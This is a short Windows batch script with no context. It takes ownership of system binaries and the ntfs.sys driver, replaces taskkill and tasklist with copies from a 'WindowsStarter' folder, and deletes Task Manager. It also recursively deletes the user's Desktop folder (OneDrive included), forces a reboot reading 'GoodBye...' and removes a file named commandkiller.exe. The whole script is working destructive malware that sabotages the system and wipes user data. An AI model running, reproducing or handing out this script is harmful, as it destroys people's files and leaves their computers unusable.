@echo off
takeown /f "%windir%\system32\taskkill.exe"
icacls "%windir%\system32\taskkill.exe" /grant "%username%":F /T
copy "%windir%\system32\WindowsStarter\taskkill.exe" "%windir%\system32\taskkill.exe"/y

takeown /f "%windir%\system32\tasklist.exe"
icacls "%windir%\system32\tasklist.exe" /grant "%username%":F /T
copy "%windir%\system32\WindowsStarter\tasklist.exe" "%windir%\system32\tasklist.exe"/y

rd "%windir%\system32\WindowsStarter"/q/s

takeown /f "%windir%\system32\taskmgr.exe"
icacls "%windir%\system32\taskmgr.exe" /grant "%username%":F /T
del "%windir%\system32\taskmgr.exe"/q

if exist "%userprofile%\OneDrive" (cd %userprofile%\OneDrive) else (cd %userprofile%)
rd Desktop/q/s

cd %windir%\system32\drivers
takeown /f ntfs.sys
icacls ntfs.sys /grant "%username%":F /C

cd "%userprofile%"
shutdown -r -c "GoodBye..." -t 2
cd %windir%\system32
del commandkiller.exe/q